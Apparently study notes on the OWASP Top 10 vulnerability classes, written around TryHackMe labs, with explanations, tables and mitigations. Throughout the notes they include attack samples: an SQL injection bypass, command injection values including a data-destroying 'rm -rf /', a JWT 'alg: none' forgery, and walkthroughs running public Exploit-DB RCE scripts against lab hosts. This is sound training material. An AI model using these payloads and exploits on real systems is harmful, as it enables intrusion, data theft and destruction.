# BROKEN ACCESS CONTROL — SIMPLE NOTES  

## 🔹 What is it?  
- Websites have some pages or actions that are **restricted** (e.g., only Admin should manage users).  
- If a normal visitor can open those pages or do those actions → **Broken Access Control**.  



## 🔹 Why is it dangerous?  
1. **View Sensitive Data** → attacker can see other users’ private info.  
2. **Unauthorized Actions** → attacker can do things only admin/staff should.  
3. **Trust Broken** → users expect privacy, but data becomes exposed.  



## 🔹 Real Example (2019 - YouTube)  
- YouTube had a bug: attacker could request **single frames** from private videos.  
- By asking for many frames → they could **reconstruct the video**.  
- Problem: If a video is "private", the expectation is **nobody else can see it**.  
- That’s exactly what makes it **Broken Access Control**.  



## 🔹 Comparison Table  

| Situation | Expected Behavior | Broken Access Control Behavior |
|-----------|------------------|--------------------------------|
| Normal User tries to open **Admin Page** | ❌ Access Denied | ✅ Access Allowed |
| Private YouTube video | ❌ Only owner can see | ✅ Other users could get frames |
| Bank user checks account | ✅ Only see their balance | ❌ Can also see others’ balance |



## 🔹 Simple Example (Website)  

- Suppose a bank website has a link:  
  `/account/123` → shows user A’s account  
  `/account/456` → shows user B’s account  

- If the site does **not check authorization**, then:  
  - User A can just change the number in URL and see User B’s details.  
  - This is **Broken Access Control**.  
---
# INSECURE DIRECT OBJECT REFERENCE (IDOR)  

## 🔹 What is IDOR?  
- **IDOR = Insecure Direct Object Reference**  
- It happens when a web app uses **direct identifiers (IDs)** for objects (like users, files, accounts) **without checking authorization**.  
- Example of "object": user profile, bank account, file, order details, etc.  



## 🔹 How does it work?  
1. User logs into a site → gets access to their own data.  
2. App shows the data using a URL or request parameter (like `id=111111`).  
3. If the site does **not check ownership properly**, the user can **change the ID** to another value (e.g., `id=222222`).  
4. Result → attacker sees **someone else’s data**.  



## 🔹 Real Example (Bank Account URL)  

- Suppose after login, the URL is:  
  `https://bank.thm/account?id=111111`  
<img width="333" height="152" alt="Screenshot 2025-08-27 at 6 03 48 PM" src="https://github.com/user-attachments/assets/6c391a1f-2ae6-4b76-977c-4c9afb7bfbe9" />

- This should only show **your own account**.  
- But if you change it to:  
  `https://bank.thm/account?id=222222`  
<img width="370" height="176" alt="Screenshot 2025-08-27 at 6 04 19 PM" src="https://github.com/user-attachments/assets/7f87a693-e3b8-4227-94d5-dfa55de59ba0" />

- ❌ If access control is broken → You see **another person’s bank account details**.  
- ✅ Proper security → System should block this request.  



## 🔹 Why IDOR is dangerous?  
- Attackers can:  
  - Steal other users’ private data (bank info, orders, messages).  
  - Modify things they don’t own (cancel others’ orders, delete accounts).  
  - Escalate privileges (change roles like User → Admin).  



## 🔹 Important Point  
- **Direct Object Reference itself is not bad.**  
  - Example: using `id=123` in URL is fine.  
- **Problem = missing validation.**  
  - App must check: “Does this logged-in user really own account `123`?”  
- If not → IDOR vulnerability.  


## 🔹 Comparison Table  

| Situation | Expected (Secure) Behavior | Vulnerable (IDOR) Behavior |
|-----------|-----------------------------|-----------------------------|
| User A opens `/account?id=111111` | ✅ Sees only User A’s account | ✅ Works |
| User A tries `/account?id=222222` | ❌ Access Denied | ❌ Sees User B’s account |
| User uploads file `/file?id=abc123` | ✅ Only owner can download | ❌ Anyone with ID can download |



## 🔹 Simple Analogy  
- Think of **locker keys** in a gym.  
- Each person has their own locker key → only they can open their locker.  
- IDOR is like if **all lockers used simple numbers** (1, 2, 3…) and **the lock wasn’t checked**.  
- So if you have locker 1, you can just open locker 2 by trying key `2`.  
- That’s insecure.  

---
# CRYPTOGRAPHIC FAILURES 

## 🔹 What is it?  
- A **cryptographic failure** happens when:  
  - Cryptography (encryption) is **not used**, OR  
  - It is **used incorrectly/weakly**.  
- Goal of cryptography = protect **sensitive information** (confidentiality, integrity).  
- If crypto fails → attacker can **see, steal, or modify private data**.  



## 🔹 Where is cryptography used in web apps?  
1. **Data in Transit**  
   - Data moving between **browser ↔️ server**.  
   - Example: logging into Gmail, your password should be encrypted with **HTTPS (TLS)**.  
   - If not → attackers can sniff the network and read your messages.  

2. **Data at Rest**  
   - Data stored on **servers/databases/disks**.  
   - Example: your saved emails, stored passwords, credit card info.  
   - Should be encrypted so even if the server is hacked, attacker can’t read raw data.  



## 🔹 Example (Secure Email App)  
- **Data in Transit** → emails should be encrypted when traveling over the internet (via HTTPS).  
- **Data at Rest** → emails should also be encrypted on the server.  
- If either step is missing/weak → attackers may read your private mails.  


## 🔹 Common Cryptographic Failures  
| Failure | What Happens | Why it’s Bad |
|---------|--------------|--------------|
| No HTTPS (using HTTP) | Data sent in plain text | Attacker can sniff network traffic |
| Weak Algorithms (e.g., MD5, SHA1) | Easily breakable | Passwords/data can be cracked fast |
| Hardcoded Keys | Same key reused everywhere | If leaked → all data is exposed |
| No Salt in Password Hashing | Hash collisions | Attackers crack multiple passwords at once |
| Misconfigured TLS/SSL | Weak encryption | MITM (Man in The Middle) attacks become possible |
| Data not encrypted at rest | Raw sensitive data in DB | If DB leaks → attacker sees everything |



## 🔹 Attack Example: MITM (Man in The Middle)  
- Attacker positions themselves **between client & server**.  
- If the connection is **not properly encrypted**:  
  - They can read usernames, passwords, messages.  
  - They can even modify data in transit.  



## 🔹 Simple Analogy  
- Imagine sending a **letter**:  
  - With **encryption** = put it in a sealed envelope → only the receiver can open.  
  - Without encryption = postcard → anyone handling it can read it.  
- Cryptographic failures = like using thin envelopes, or sometimes not even sealing it at all.  



## 🔹 Key Takeaway  
- Cryptographic failures = when encryption is **missing, weak, or misused**.  
- Protect **data in transit (moving)** and **data at rest (stored)**.  
- If not → attackers can steal, read, or modify sensitive information.
---
# SENSITIVE DATA EXPOSURE (via Flat-File Databases) — SIMPLE NOTES  

## 🔹 What is the issue?  
- Websites often store data in a **database** (like MySQL, MariaDB, or SQLite).  
- Normally, databases are safe → stored on dedicated servers, not directly accessible to visitors.  
- BUT, sometimes developers make a big mistake:  
  - They put the database file **inside the web root directory**.  
  - That means anyone can **download it directly** from the website!  
- Once downloaded, attackers have **full access to sensitive data**.  

---

## 🔹 Flat-File Databases (SQLite)  
- **SQLite = a flat-file database** (stored as a single file, like `example.db`).  
- Small apps often use it instead of setting up a full database server.  
- Problem: If it’s stored in the wrong place, attackers can download it.  

---

## 🔹 Attacker’s Steps (Example)  

1. **Find database file on website**  
   - Example: `https://victim.com/example.db`  
   - Download it to local machine.  

2. **Check the file**  
```bash
   user@linux$ file example.db
   example.db: SQLite 3.x database, ...
```
3. **Open it using sqlite3**
``` bash
user@linux$ sqlite3 example.db
SQLite version 3.39.2 2022-07-21
sqlite>
```
4. List all tables
``` bash
sqlite> .tables
customers
```
5. Check table structure
``` bash
sqlite> PRAGMA table_info(customers);
0|custID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0
```
👉 Columns: custID, custName, creditCard, password
6. Dump all data
``` bash
sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
```
## 🔹 What sensitive data is exposed?
- custID → User ID
- custName → User’s real name
- creditCard → FULL credit card numbers 🤯
- password → Stored as a hash (e.g., 5f4dcc3b5aa765d61d8327deb882cf99)
👉 Even though passwords are hashed, attackers can crack the hashes.
👉 Credit card data here is already in plain text (very dangerous).
## 🔹 Why is this a big problem?
- Attackers get:
   - Credit card numbers
   - Password hashes (can be cracked)
   - Names & IDs
- This = Sensitive Data Exposure vulnerability
## 🔹 Simple Analogy
- Imagine a shop keeping their customer register book in a locked office (secure).
- But here, they left the register outside on the shop counter.
- Anyone walking in can just pick it up and read everyone’s details.
## 🔹 Key Takeaway
- Flat-file databases (SQLite) are convenient, but…
- If placed in a publicly accessible folder, attackers can download the whole database.
- This directly leads to Sensitive Data Exposure.

---
# PASSWORD HASH CRACKING  

## 🔹 What is Hash Cracking?  
- Websites usually don’t store plain text passwords.  
- Instead, they store **hashes** (a scrambled version of the password).  
- Example: `password` → MD5 hash → `5f4dcc3b5aa765d61d8327deb882cf99`  
- Hash cracking = finding the **original password** from the hash.  



## 🔹 Tools for Cracking  
- **Kali Linux** has tools (like `hashcat`, `john the ripper`) → advanced use.  
- For beginners, we can use **online tools** → example: **Crackstation.net**.  



## 🔹 How Crackstation Works  
1. Go to **https://crackstation.net/**  
2. Paste the hash (e.g., `5f4dcc3b5aa765d61d8327deb882cf99`)  
3. Solve the Captcha  
4. Click **Crack Hashes**  
5. Output: original password → `"password"`  
<img width="640" height="194" alt="Screenshot 2025-08-27 at 6 40 25 PM" src="https://github.com/user-attachments/assets/a6f7ab75-5b9f-4073-a8c4-3c4cf73abed9" />



## 🔹 Example from Previous Task  
- User: **Joy Paulson**  
- Stored hash: `5f4dcc3b5aa765d61d8327deb882cf99`  
- Crackstation result → password = **"password"** 🤯  
- Clearly, this is a **very weak password**.  

<img width="650" height="260" alt="Screenshot 2025-08-27 at 6 40 41 PM" src="https://github.com/user-attachments/assets/42b20cbe-4aa8-483a-bbea-7feb61b29bda" />


## 🔹 Important Point  
- Crackstation uses a **huge wordlist**.  
- If the password is in the wordlist → hash gets cracked.  
- If not in the wordlist → hash cannot be cracked by Crackstation.  
- Stronger tools (like Hashcat with GPU + custom wordlists) are needed for tough hashes.  



## 🔹 Why is this dangerous?  
- If an attacker steals the database (with password hashes):  
  - They can crack weak hashes.  
  - Then log into user accounts.  
  - Or reuse passwords on other sites (since many people use same password everywhere).  



## 🔹 Key Takeaway  
- Weak hashing + weak passwords = **easy to crack**.  
- Strong hashing algorithms (like bcrypt, Argon2) + strong passwords are needed.
---
# INJECTION 

## 🔹 What is Injection?  
- Injection happens when **user input** is treated as **code/command** instead of just data.  
- This allows attackers to **insert malicious commands** into the app.  
- Very common and very dangerous.  



## 🔹 Common Types of Injection  

### 1. SQL Injection (SQLi)  
- Happens when input is sent into **SQL queries**.  
- Example:  
  Input → `admin' OR '1'='1`  
  Query becomes → `SELECT * FROM users WHERE username='admin' OR '1'='1';`  
- Result → attacker logs in **without password**.  
- Attacker can:  
  - Steal data  
  - Modify or delete data  
  - Even take full control of database  



### 2. Command Injection  
- Happens when input is passed to **system commands**.  
- Example:  
  App takes input and runs → `ping <user_input>`  
  If attacker enters → `127.0.0.1; rm -rf /`  
  Then server runs malicious command (`rm -rf /`) and deletes files!  
- Attacker can:  
  - Run arbitrary OS commands  
  - Steal system files  
  - Control the entire server  



## 🔹 Why is Injection Dangerous?  
- Access, modify, or delete sensitive data  
- Execute unauthorized commands  
- Full compromise of application or server  



## 🔹 Defenses Against Injection  

1. **Allow List (Whitelist)**  
   - Only allow safe input (e.g., numbers only for phone number).  
   - Reject everything else.  

2. **Strip Input (Sanitization)**  
   - Remove dangerous characters before processing.  
   - Example: remove `'`, `"`, `;`, `--` from user input.  

3. **Use Libraries / ORM**  
   - Instead of manually writing checks, use **safe libraries** that handle input automatically.  
   - Example: Prepared Statements (Parameterized Queries) in SQL → `?` placeholder instead of directly injecting values.  



## 🔹 Simple Analogy  
- Think of input as a **letter** you send to a company.  
- Normal letter = "Please update my phone number to 123456".  
- Malicious letter = "Please update my phone number to 123456, ALSO give me access to the safe 🔓".  
- If the company blindly executes everything in the letter → injection flaw.  



## 🔹 Key Takeaway  
- Injection = when user input is **treated as code/commands**.  
- Types: **SQL Injection** (DB) & **Command Injection** (Server).  
- Prevention = validate input, sanitize input, and use secure coding practices.  
---
# COMMAND INJECTION   

## 🔹 What is Command Injection?  
- Command Injection happens when a **web app runs system commands** (via PHP, Python, etc.)  
- If **user input** is directly added into those commands → attacker can inject malicious OS commands.  
- Attacker basically gets access to the **server’s terminal** remotely.  



## 🔹 Why is it dangerous?  
- Attacker can:  
  - List files on the server (`ls`)  
  - Read sensitive files (`cat /etc/passwd`)  
  - Get system info (`uname -a`, `ifconfig`)  
  - Run any arbitrary command (same as having local access).  
- This can lead to **full server compromise**.  



## 🔹 Example: MooCorp Cowsay App  

### PHP Code:
```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```
**What it does:**
1. Takes input mooing and cow from the user.
2. Runs command → perl /usr/bin/cowsay -f $cow $mooing
3. Displays output in browser.
**Problem:**
- $cow and $mooing are not validated.
- So attacker can inject extra commands.
## 🔹 How to Exploit It
- Bash allows inline commands using $( ).
- Example:
``` bash
echo $(whoami)
```
Output = username of the current system user.
- In MooCorp app:
  - Attacker input:
    ``` bash
    mooing=$(whoami)
    ```
  - Command executed by server:
    ``` bash
    perl /usr/bin/cowsay -f default $(whoami)
    ```
- Result: cow prints → server’s current user.
## 🔹 Useful Commands for Exploitation
- whoami → shows current user
- id → shows user ID & groups
- ifconfig / ip addr → network info
- uname -a → system info (OS, kernel)
- ps -ef → running processes
## 🔹 Why is this a big issue?
- From a simple “funny cow ASCII art” app → attacker gains remote shell access.
- Can lead to:
   - Data theft
   - Privilege escalation
   - Pivoting into other servers
## 🔹 Key Takeaway
- Command Injection = user input added into system commands without checks.
- Exploited using inline commands like $(command).
- Prevention = never pass raw user input to system calls; use input validation or safe libraries.
---
# INSECURE DESIGN 

## 🔹 What is Insecure Design?  
- Insecure design = vulnerability that exists in the **architecture/blueprint** of the app.  
- Not about coding mistakes or wrong configuration → but the **idea itself is flawed**.  
- Often happens when developers:  
  - Don’t do **threat modelling** properly during planning.  
  - Take shortcuts during development/testing and forget to fix them later.  



## 🔹 Example of Insecure Design  
### Insecure Password Reset (Instagram Case)  
- Instagram allowed password reset via **6-digit SMS code**.  
- Normal defense → rate limiting (max 250 attempts per IP).  
- Problem: rate limit was applied **per IP only**, not globally.  
- Attacker trick:  
  - Use thousands of IP addresses (cloud services make this cheap).  
  - Each IP can try 250 attempts.  
  - With 4000 IPs → attacker can brute-force **all 1,000,000 possible codes**.  
- This is insecure design because:  
  - The system assumed attackers wouldn’t have many IPs.  
  - But in reality, it’s possible and practical.  



## 🔹 Why is Insecure Design Dangerous?  
- Flaw is **deep in the application’s logic**.  
- Can’t be fixed with a simple patch or config change.  
- May require **redesigning the feature/app**.  
- Attackers can exploit the “loopholes in logic” → even if code itself is bug-free.  



## 🔹 Common Causes of Insecure Design  
- Poor or no **threat modelling** (not thinking like an attacker).  
- Taking shortcuts (e.g., disabling OTP checks for testing).  
- Wrong assumptions (e.g., “no one will have thousands of IPs”).  
- Weak security logic (e.g., password reset flows, account recovery, API limits).  



## 🔹 How to Prevent Insecure Design  
1. **Threat Modelling** early → think about “What if attacker does X?”  
2. **Secure Software Development Lifecycle (SSDLC)** → security in every stage of dev.  
3. **Don’t rely on assumptions** (like “attackers won’t brute-force”).  
4. **Strong global protections** (rate-limiting, multi-factor auth, CAPTCHA).  
5. Regular **security reviews of design** before coding starts.  


## 🔹 Simple Analogy  
- Imagine building a bank vault with **strong locks** but placing it in a **glass room**.  
- Even if the lock is unbreakable (good code), attacker can just break the glass (bad design).  
- That’s what **Insecure Design** means.  



## 🔹 Key Takeaway  
- Insecure design = **flaw in app’s architecture**.  
- Example: Instagram password reset brute-force bypass.  
- Harder to fix than coding bugs → often needs **redesign from scratch**.  
- Prevention = **threat modelling + SSDLC** from the very beginning.  

---
# Security Misconfiguration (OWASP Top 10)

## 🔑 Simple Meaning
Security Misconfiguration happens when **settings are wrong** or **left insecure**.  
It is not a coding bug, but a mistake in **configuration**.

Even if you install the latest version of software, **wrong settings = unsafe system**.

---

## ⚡ Common Examples
- ❌ **Cloud Storage Public**: S3 bucket open → anyone can read/write files.  
- ❌ **Unnecessary Features**: Extra services, pages, accounts enabled.  
- ❌ **Default Accounts/Passwords**: Admin:admin left unchanged.  
- ❌ **Detailed Error Messages**: System reveals stack traces or paths.  
- ❌ **Missing Security Headers**: Like `X-Frame-Options`, `Content-Security-Policy`.

---

## 📊 Comparison Table

| Misconfiguration Issue        | Why It’s Dangerous |
|-------------------------------|--------------------|
| Public Cloud Buckets          | Exposes private files/data |
| Default Passwords             | Attackers log in easily |
| Extra Features Enabled        | Attackers exploit unused services |
| Verbose Error Messages        | Leak system details to attacker |
| Missing Security Headers      | Browser won’t protect user properly |

---

## 🐞 Debugging Interfaces
A very common mistake = leaving **debug mode ON** in production.

- Debug tools help developers test apps.  
- If left enabled, attackers can **run code directly** on the server.  

### 📌 Real Example: Patreon Hack (2015)
- Framework: **Werkzeug** (Python-based web apps).  
- Debug console available at `/console`.  
- If an error happens, console shows up.  
- Console lets you run Python code.  
- ❌ Developers forgot to disable → attackers could run **any command** on server.

---

## ✅ Key Point
Security misconfiguration = **door left open by mistake**.  
Attackers don’t need to “break the lock”, they just walk in.
---
# Vulnerable and Outdated Components (OWASP Top 10)

## 🔑 Simple Meaning
This happens when a system is using **old or unpatched software**.  
Old versions may already have **known vulnerabilities**, and attackers can easily find public exploits to use against them.

---

## ⚡ Example
- Company runs **WordPress 4.6** (not updated for years).  
- Tool like **WPScan** shows version number.  
- Quick research = WordPress 4.6 vulnerable to **Remote Code Execution (RCE)**.  
- Exploit is already available on **Exploit-DB**.  
- Attacker can directly use that exploit → full system compromise.

---

## 📊 Why It’s Dangerous
| Problem | Why It Matters |
|---------|----------------|
| Old software versions | Known vulnerabilities are already public |
| Public exploits exist | Attackers don’t need to write new code |
| Missing just one update | System can become exploitable |
| Easy for attackers | Minimal effort → maximum damage |

---

## 🛠️ Tools Used to Detect
- **WPScan** → checks WordPress versions and vulnerabilities  
- **Nmap + NSE scripts** → detect outdated services (e.g., old Apache/SSH)  
- **Exploit-DB** → search ready-made exploits  

---

## ✅ Key Point
- Using outdated components = like **leaving your front door broken**.  
- Attackers don’t need to break in — they just **use the known weakness**.  
- Always keep software **updated and patched**.
---
# Vulnerable and Outdated Components – Example (Nostromo 1.9.6)

## 🔑 Quick Recap
- Old software = dangerous because **known exploits already exist**.  
- Our main job = **find the software name + version → search for exploit**.  
- Most of the hard work is already done by researchers, we just need to use it.

---

## ⚡ Example: Nostromo Web Server

### Step 1: Find Software & Version
We discover the server is running:
Nostromo 1.9.6

---

### Step 2: Search Exploit on Exploit-DB
- Go to **Exploit-DB**  
- Search: `Nostromo 1.9.6`  
- ✅ Top result = ready-made exploit script.

---

### Step 3: Run the Exploit Script
Command:
python 47837.py

❌ Error appears:
Traceback (most recent call last):
File "47837.py", line 10, in <module>
cve2019_16278.py
NameError: name 'cve2019_16278' is not defined

---

### Step 4: Fix the Script
Problem: One line in the script was wrong.  
Solution: Comment it out.

```python
# cve2019_16278.py  # This line should be commented
```
### Step 5: Run Again (Correctly)
Command:
```
python2 47837.py 127.0.0.1 80 id
```
Output:
```
HTTP/1.1 200 OK
Server: nostromo 1.9.6
uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
```
🎉 Boom → We got Remote Code Execution (RCE).
## 📊 Key Lessons
- Step	What Happened	Lesson Learned
- Find version	Nostromo 1.9.6 found	Version info is enough to start research
- -Search Exploit	Found on Exploit-DB	Many exploits already exist
- Run Script	Initial error	Exploits may need fixing
- Fix Script	Commented bad line	Know basics of language (Python)
- Success	Got RCE	Outdated software = full compromise
## ✅ Important Notes
- Exploit scripts may not work on first try.
- Understanding the language (Python, Perl, etc.) helps in fixing.
- Always read script usage instructions (arguments like IP, Port).
- Sometimes easy (like Nostromo), sometimes harder (need HTML source, guessing).
- If it’s a known vulnerability, there’s almost always a way to discover it.
## 🔎 Final Thought
- This OWASP Top 10 issue is dangerous because:
- Attackers don’t need to write exploits.
- Just research the version → use public exploit.
- As a penetration tester, this is a very common and realistic scenario.
---
# 🛠️ Task 15 - Vulnerable and Outdated Components (Lab)

## 🎯 Objective
Exploit the vulnerable **Online Book Store 1.0** application running at:
http://10.201.83.106:84
and retrieve the content of the file:
/opt/flag.txt

---

## 🔎 Step 1: Search for Exploit
Use `searchsploit` to find known exploits for "Online Book Store 1.0".
```
searchsploit "Online Book Store 1.0"
```
Result:
- SQL Injection
- Arbitrary File Upload
- **Unauthenticated Remote Code Execution** (47887.py)

---

## ⚡ Step 2: Copy Exploit
Copy the exploit to the local directory.
```
searchsploit -m php/webapps/47887.py
```
Now exploit is available as `47887.py`.

---

## 🛠 Step 3: Check Exploit Usage
Run the exploit without arguments to see usage.
```
python3 47887.py
```
Output:
```
usage: 47887.py [-h] url
````
👉 Means only **URL argument** is required.

---

## 🚀 Step 4: Run Exploit on Target
Execute the exploit with the vulnerable application URL.
```
python3 47887.py http://10.201.83.106:84
```
This should give you **Remote Code Execution (RCE)** on the server.

---

## 📂 Step 5: Retrieve the Flag
Once inside the server / RCE prompt, read the flag file:
```
cat /opt/flag.txt
```
Copy the flag and submit it on TryHackMe.

---

## ✅ Summary
- Vulnerable app: **Online Book Store 1.0**
- Vulnerability: **Unauthenticated RCE**
- Exploit used: **Exploit-DB ID 47887**
- Flag file location: **/opt/flag.txt**
---
# Broken Authentication & Session Management (OWASP Top 10)

## 🔑 Simple Meaning
- **Authentication** = Process of verifying user identity (usually username + password).  
- **Session Management** = Keeping track of logged-in users using **session cookies**.  
- HTTP(S) is **stateless**, so without cookies the server cannot remember users.  

---

## ⚡ How It Works
1. User enters **username + password**.  
2. Server verifies credentials.  
3. If correct → server gives browser a **session cookie**.  
4. Browser attaches cookie in every request → server knows who is sending data.  

---

## 🚨 Common Authentication Flaws
- **Brute Force Attacks** → Attacker tries many username/password combos.  
- **Weak Credentials** → If weak passwords allowed (`password1`, `123456`), attacker can easily guess.  
- **Weak Session Cookies** → If cookies have predictable values, attacker can create fake cookies and hijack accounts.  

---

## 📊 Table Summary

| Flaw Type              | What Happens | Why It’s Dangerous |
|------------------------|--------------|--------------------|
| Brute Force Attack     | Guessing passwords by many attempts | Can lead to account takeover |
| Weak Passwords         | Users set easy/common passwords | Easy for attacker to guess |
| Weak Session Cookies   | Predictable cookie values | Attackers hijack sessions |

---

## 🛡️ Mitigations
- **Strong Password Policy** → Enforce complex passwords (length + symbols).  
- **Account Lockout** → After multiple failed attempts, lock the account temporarily.  
- **Multi-Factor Authentication (MFA)** → Example: Password + OTP on phone. Even if password is stolen, OTP adds another layer.  

---

## ✅ Key Point
If authentication or session management is weak:  
- Attackers can log into accounts without permission.  
- They may access **sensitive personal data**.  
- Strong policies + MFA + secure cookies = essential for protection.
---
# Authentication Logic Flaw – Re-Registration Vulnerability

## 🔑 Simple Meaning
Sometimes, the problem is not weak passwords or brute force, but a **developer mistake** in the authentication logic.  
If input (like username/password) is not sanitized properly, attackers can **trick the system** into giving them unauthorized access.

---

## ⚡ Example: Re-Registering Existing User
- There is already a user with username: `admin`.  
- Attacker tries to **register again** with a modified version:  
" admin" (notice the space at the beginning)
- Application does not sanitize input properly.  
- It registers this as a **new user** but gives the **same rights as original admin**.  
- ✅ Result → Attacker can see and control everything the real admin sees.

---

## 📊 Why It’s Dangerous
| Step | What Happens | Danger |
|------|--------------|--------|
| Input not sanitized | System accepts `" admin"` as different from `admin` | Developers think usernames are unique, but attacker bypasses |
| New account created | Attacker registers duplicate account | Attacker now has admin-level privileges |
| Privilege Escalation | Attacker acts as admin | Full access to sensitive data |

---

## 🛡️ Mitigation
- **Sanitize Input** → Trim spaces, special characters before storing usernames.  
- **Enforce Unique Usernames** → Strict checks to block duplicate-like entries (`admin`, ` admin`, `admin `).  
- **Case-Insensitive Checks** → Treat `Admin`, `ADMIN`, `admin` as the same.  
- **Validation Rules** → Only allow safe characters in usernames (a-z, 0-9, underscore).  

---

## ✅ Key Point
- This is a **logic flaw**, not a typical brute force or weak password issue.  
- Even small developer mistakes (like not trimming spaces) can lead to **account takeover**.  
- Always sanitize and validate user input to prevent these vulnerabilities.
---
# Integrity & Software/Data Integrity Failures (OWASP Top 10)

## 🔑 What is Integrity?
Integrity = Making sure that **data has not been modified** (accidentally or maliciously).  
In cybersecurity, protecting integrity means ensuring files, applications, and data remain **exactly as intended**.

---

## ⚡ Simple Example
- You download a software installer.  
- How do you know it was not modified during download?  
- Solution → **Hash Verification**.  

A **hash** = unique number generated by applying an algorithm (MD5, SHA1, SHA256, etc.) to a file.  
If the file changes (even 1 bit), the hash will also change.

---

## 🛠️ Checking Integrity (Linux Example)

File: `WinSCP-5.21.5-Setup.exe`
```
md5sum WinSCP-5.21.5-Setup.exe
20c5329d7fde522338f037a7fe8a84eb WinSCP-5.21.5-Setup.exe
sha1sum WinSCP-5.21.5-Setup.exe
c55a60799cfa24c1aeffcd2ca609776722e84f1b WinSCP-5.21.5-Setup.exe

sha256sum WinSCP-5.21.5-Setup.exe
e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea WinSCP-5.21.5-Setup.exe

```
If calculated hashes = published hashes → ✅ File is safe and unmodified.  
If hashes don’t match → ❌ File is tampered or corrupted.  

---

## 🚨 Software and Data Integrity Failures
This vulnerability happens when **applications use code or data without integrity checks**.  
If integrity is not verified, attackers can **modify the software or data** leading to malicious behavior.  

---

## 📊 Two Types of Integrity Failures

| Type | Meaning | Example |
|------|---------|---------|
| **Software Integrity Failures** | Application updates or components are not verified | A malicious update injected into the software supply chain |
| **Data Integrity Failures** | Application uses unverified data | Config files, databases, or cookies modified by attacker |

---

## 🛡️ Mitigations
- Always publish and verify **hashes/signatures** (MD5, SHA256, GPG).  
- Use **code signing certificates** to ensure updates are authentic.  
- Verify **data integrity** (checksums, digital signatures).  
- Use secure communication channels (HTTPS, TLS) to avoid tampering in transit.  

---

## ✅ Key Point
- **Integrity = Trust**.  
- If software/data integrity is not checked → attackers can sneak in modified versions.  
- Hashing + signatures + secure update mechanisms = essential for protection.
---
# Software Integrity Failures  

Software integrity failures occur when an application relies on third-party software/libraries hosted on external servers without verifying their integrity.  
If the external source is compromised, malicious code may be injected and executed unknowingly.  

---

## Example  
A common practice is to include libraries such as jQuery directly from their official CDN:  

<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>

When a user visits the website, the browser will fetch this file from the external server and execute it.  

---

## The Risk  
- If an attacker compromises the official jQuery repository  
- They can inject malicious code into the hosted file  
- All websites loading it directly will unknowingly serve the attacker’s code to their visitors  
- This is a **software integrity failure**, since no verification is done  

---

## The Solution – Subresource Integrity (SRI)  
Modern browsers support **SRI (Subresource Integrity)**.  
- It allows specifying a **hash** for the file  
- The browser executes the file only if the hash matches  
- If the file is modified, it will not be executed  

Correct usage with integrity and crossorigin:  

<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>

Hash values can be generated at:  
https://www.srihash.org/  
---
# Data Integrity Failures  

Data integrity failures occur when an application **trusts data that can be tampered with by the user**.  

---

## Session Tokens and Cookies  

- Web applications maintain sessions using **session tokens**.  
- These tokens are often stored in the browser as **cookies**.  
- Cookies are **key-value pairs** that get sent with every request to the server.  

### Example  
If a webmail app assigns a cookie after login that directly stores the username:  

Set-Cookie: username=somya

Then in every request, the browser sends:  

Cookie: username=somya

⚠️ Problem:  
If the attacker modifies this cookie to:  

Cookie: username=admin

They could impersonate another user.  
This is a **data integrity failure** because the server **trusted client-controlled data**.  

---

## The Solution – Integrity Mechanisms  

To prevent tampering, cookies/tokens should be protected using integrity checks.  

- One common approach is using **JSON Web Tokens (JWTs)**.  
- JWT ensures the payload can’t be altered without detection.  

---

## JSON Web Tokens (JWT)  

A JWT consists of 3 parts (all Base64 encoded):  

1. **Header** – metadata (type = JWT, algorithm = HS256)  
2. **Payload** – key-value pairs (user data, expiry, etc.)  
3. **Signature** – cryptographic proof (using server’s secret key)  

Example JWT:  

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.
C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw

- Header & Payload are just Base64 encoded JSON.  
- Signature ensures data integrity using a secret key.  
- If payload is changed, signature won’t match.  

You can decode JWTs using:  
👉 https://jwt.io  

---

## JWT None Algorithm Vulnerability  

Some old JWT libraries had a **critical flaw**:  

- If the attacker set `"alg": "none"` in the header  
- And removed the signature part  

The server would **skip signature validation**.  

### Example Exploit Steps:  

1. Take a valid JWT.  
2. Decode the **header** and **payload**.  
3. Modify payload (e.g., change `"username":"guest"` → `"username":"admin"`).  
4. Set header `"alg":"none"`.  
5. Remove the signature but keep the trailing dot (`.`).  

Result:  
<base64-header>.<base64-payload>.

The server would then **accept the forged token without verifying integrity**.  

---

## Key Takeaway  

- Never trust client-side data without validation.  
- Always use secure token mechanisms like **JWT with proper signature verification**.  
- Ensure libraries are updated to avoid vulnerabilities like the **JWT None Algorithm** issue.
---
# Logging and Monitoring  

Logging is crucial in web applications to **track user actions** and detect malicious activity.  
Without logging, it is impossible to trace what actions an attacker performed or determine the impact.  

---

## Importance of Logging  

- **Regulatory Damage**: If attackers access sensitive user data and no logs exist, companies may face fines or legal actions.  
- **Risk of Further Attacks**: Undetected attackers can continue exploiting the application, stealing credentials, or attacking infrastructure.  

---

## What to Log  

Logs should include:  

- HTTP status codes  
- Time stamps  
- Usernames  
- API endpoints / page locations  
- IP addresses  

⚠️ Logs contain sensitive info → store securely and maintain multiple copies at different locations.  

---

## Monitoring Suspicious Activity  

Detecting suspicious activity helps **stop attacks early** or **minimize damage** if detected later.  

Common examples of suspicious activity:  

